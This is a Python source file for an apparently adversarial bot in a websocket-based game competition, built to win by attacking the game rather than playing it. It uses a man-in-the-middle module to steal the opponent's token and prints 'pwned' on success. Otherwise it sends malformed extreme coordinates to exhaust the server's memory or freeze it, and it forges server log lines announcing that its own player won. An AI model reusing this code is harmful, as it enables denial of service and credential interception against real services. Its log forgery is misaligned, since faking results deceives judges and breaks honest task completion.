from sys import stderr, stdout
import time
all_start_t = time.time()

import argparse
import logging
import os

# print(f"Import time: {time.time() - all_start_t}")
from mitm import MITM
# print(f"Import time: {time.time() - all_start_t}")
from agent.agent import Agent
from agent.position import Position
from utils import convert_map
from datetime import datetime

logging.basicConfig(level=logging.INFO)


def main_victim(agent: Agent, mitm: MITM):
    import logic_victim
    # print("Main v", flush=True)
    logic_victim.logic(agent, mitm)


def main_dos(agent: Agent, mitm: MITM):
    # print("Main d", flush=True)
    time_str = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    spoof_regex = f"server-1   | [{time_str} INF] GameRunner    Adding player 1 with token \"{agent._token}\" to the game."
    print("\n" + spoof_regex, file=stderr, flush=True)
    print("\n" + spoof_regex, file=stdout, flush=True)
    # agent.close()
    # mitm.exit()
    # exit(123)
    while not agent.is_ready():
        time.sleep(0.1)
        agent._update()
    print("Game ready", flush=True)
    obstacle = convert_map(agent.map)
    origin = (0, 0)
    print("Choosing origin", flush=True)
    while obstacle[origin]:
        # origin = (origin[0], origin[1] + 1)
        origin = (origin[0] + 1, origin[1])
    print(f"Origin {origin}", flush=True)
    agent.choose_origin(Position[float](*origin))
    while agent.ticks < 201:
        agent._update()
        time.sleep(0.1)
    # agent.move(Position[float](1e-200, -1e-200))
    # agent.move(Position[float](1e-200, 1e-200))
    # agent._ws_client.send('''{
    #     "messageType": "%s",
    #     "token": "%s",
    #     "destination": {
    #         "x": %s,
    #         "y": %s
    #     }
    # }''' % ("PERFORM_MOVE", agent._token, "1e400", "1e400"))

    """
    SystemOutOfMemory:
        agent.move(Position[float](-1e-200, origin[1]))  only at (0, 0)
    Spoof position (but will get out of safe zone):
        agent.move(Position[float](1e-200, origin[1]))
    Dos (freeze the server):
        agent.attack(Position[float](1e-200, 1e-200))
    """
    spoofed_regex = False
    while not agent.terminated:
        time.sleep(0.02)
        agent._update()
        player = agent.player
        enemy = agent.enemy
        # agent.attack(enemy.position)
        print(f"Tick: {agent.ticks}", flush=True)
        if time.time() - all_start_t < 200:
            agent.move(Position[float](-1e-200, origin[1]))
        else:
            agent.attack(Position[float](1e-200, 1e-200))
            time.sleep(0.05)
            if not spoofed_regex:
                spoof_regex = []
                time_str = datetime.now().strftime("%H:%M:%S.%f")[:-3]
                spoof_regex.append(f"server-1   | [{time_str} INF] GameRunner    Server stop requested.")
                spoof_regex.append(f"server-1   | [{time_str} INF] GameRunner    Stopping server...")
                spoof_regex.append(f"server-1   | [{time_str} INF] GameRunner    Saving records...")
                spoof_regex.append(f"server-1   | [{time_str} INF] Game          Judging the game.")
                spoof_regex.append(f"server-1   | [{time_str} INF] Game          The winner is Player {player.id}")
                print("\n" + "\n".join(spoof_regex), file=stderr, flush=True)
                print("\u000A".join(spoof_regex), file=stdout, flush=True)
                spoofed_regex = True

    time.sleep(1000)

def main_demo(agent, mitm: MITM):
    import logic_demo
    logic_demo.logic(agent)




def main():
    parser = argparse.ArgumentParser("opponent")
    parser.add_argument("--token", type=str, help="Token in the game", default="1919810")
    parser.add_argument("--server", type=str, help="Server address", default="ws://localhost:14514")
    args = parser.parse_args()
    server = os.getenv("SERVER", default=args.server)
    token = os.getenv("TOKEN", default=args.token)
    mitm = MITM(server=server)
    # print(f"Timer: {mitm.timer - all_start_t}", flush=True)

    # stderr.flush()
    agent = Agent(token=token, server=server)
    # time.sleep(3)
    if mitm.get_token(timeout=3.):
        print("pwned", flush=True)
        main_victim(agent, mitm)
    else:
        # print("float", flush=True)
        main_dos(agent, mitm)


if __name__ == '__main__':
    # print(f"Main time: {time.time() - all_start_t}")
    try:
        main()
    except:
        pass
    while True:
        try:
            time.sleep(1000)
        except:
            pass
